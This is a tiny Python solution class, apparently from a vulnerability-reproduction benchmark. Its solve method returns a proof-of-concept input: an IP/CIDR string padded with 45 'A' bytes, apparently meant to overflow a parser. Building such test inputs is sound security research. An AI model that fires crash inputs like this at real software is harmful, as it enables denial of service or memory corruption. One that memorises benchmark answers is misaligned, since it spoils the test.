class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"1.1.1.1/32 " + b"A" * 45
        return poc
